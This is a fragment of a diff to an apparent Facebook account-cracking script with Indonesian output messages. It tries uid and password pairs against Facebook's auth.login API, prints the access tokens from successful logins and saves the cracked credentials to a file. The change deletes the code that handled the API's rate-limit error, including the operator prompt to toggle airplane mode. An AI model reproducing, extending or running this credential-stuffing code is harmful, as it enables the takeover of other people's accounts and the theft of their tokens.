@@ -534,15 +534,7 @@ def api(uid, pwx):
 		}
 		status_masuk = requests.get("https://b-api.facebook.com/method/auth.login",headers=headers,params=params) 
 		file_jason = json.loads(status_masuk.text)
-		if "Calls to this api have exceeded the rate limit. (613)" in file_jason:
-			t=15
-			while t:
-				mins, secs = divmod(t, 60)
-				sys.stdout.write("\r %s[!] aktifkan mode pesawat selama 5 detik%s"%(M,N))
-				sys.stdout.flush()
-				sleep(1.5)
-				t -= 1
-		elif "session_key" in status_masuk.text and "EAAA" in status_masuk.text:
+		if "session_key" in status_masuk.text and "EAAA" in status_masuk.text:
 			print("\r  %s* --> %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
 			ok.append("%s|%s"%(uid, pw))
 			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
